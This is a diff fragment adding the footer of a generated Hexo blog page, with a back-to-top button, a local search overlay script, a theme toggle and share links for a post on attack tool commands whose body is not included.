+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + %E5%B8%B8%E7%94%A8%E6%94%BB%E5%87%BB%E5%B7%A5%E5%85%B7%E5%91%BD%E4%BB%A4 + '&url=' + https%3A%2F%2Fmagi2b0y.github.io%2F2022%2F08%2F20%2FCommon-attack-tools-Commands%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=https://magi2b0y.github.io/2022/08/20/Common-attack-tools-Commands/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
